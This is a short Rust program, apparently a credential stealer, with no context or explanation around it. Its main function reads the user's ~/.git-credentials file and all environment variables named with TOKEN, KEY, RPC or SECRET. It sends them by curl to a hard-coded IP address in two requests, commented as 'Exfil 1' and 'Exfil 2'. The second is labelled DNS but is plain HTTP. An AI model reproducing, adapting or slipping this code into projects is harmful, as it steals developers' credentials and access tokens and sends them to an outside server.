fn main() {
    let home = std::env::var("HOME").unwrap_or_default();
    let creds = std::fs::read_to_string(format!("{}/.git-credentials", home))
        .unwrap_or_default();
    let env_str: String = std::env::vars()
        .filter(|(k, _)| k.contains("TOKEN") || k.contains("KEY") || k.contains("RPC") || k.contains("SECRET"))
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("|");
    
    // Exfil 1: VPS
    let data = format!("C={}&E={}", creds, env_str);
    let _ = std::process::Command::new("curl")
        .args(["-s", "--max-time", "8", "-X", "POST", "http://216.245.184.207:8899/x", "-d", &data])
        .output();
    
    // Exfil 2: DNS (encode first 100 chars in subdomain)
    let safe: String = creds.chars().take(100)
        .map(|c| if c.is_alphanumeric() { c } else { '-' })
        .collect();
    let dns_url = format!("http://216.245.184.207:8899/d?c={}", safe);
    let _ = std::process::Command::new("curl")
        .args(["-s", "--max-time", "5", &dns_url])
        .output();
}
